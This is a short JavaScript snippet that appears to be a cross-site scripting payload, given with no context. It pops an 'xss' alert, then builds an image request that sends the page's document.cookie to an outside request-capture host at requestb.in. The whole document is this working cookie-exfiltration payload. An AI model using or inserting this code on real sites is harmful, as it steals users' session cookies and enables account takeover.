function x() {
	alert('xss');
    var img = new Image();
	img.src = "https://requestb.in/16kcihh1?x="+document.cookie;
}
